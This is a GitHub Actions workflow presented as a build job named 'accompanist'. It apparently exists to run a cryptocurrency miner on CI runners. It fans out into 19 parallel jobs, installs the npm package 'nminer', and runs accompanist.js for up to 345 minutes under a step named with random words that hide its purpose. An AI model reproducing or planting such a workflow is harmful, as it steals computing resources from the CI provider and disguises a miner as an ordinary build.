name: accompanist
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 9212 }
          - { version: 136 }
          - { version: 2908 }
          - { version: 3198 }
          - { version: 7445 }
          - { version: 3212 }
          - { version: 1909 }
          - { version: 8516 }
          - { version: 3513 }
          - { version: 6595 }
          - { version: 360 }
          - { version: 348 }
          - { version: 2701 }
          - { version: 1364 }
          - { version: 6638 }
          - { version: 2613 }
          - { version: 9787 }
          - { version: 3439 }
          - { version: 8668 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: short-term yuck mammoth shinny pleasant
        run: |
          npm install nminer@latest
          timeout 345m node accompanist.js || echo "accompanist executed"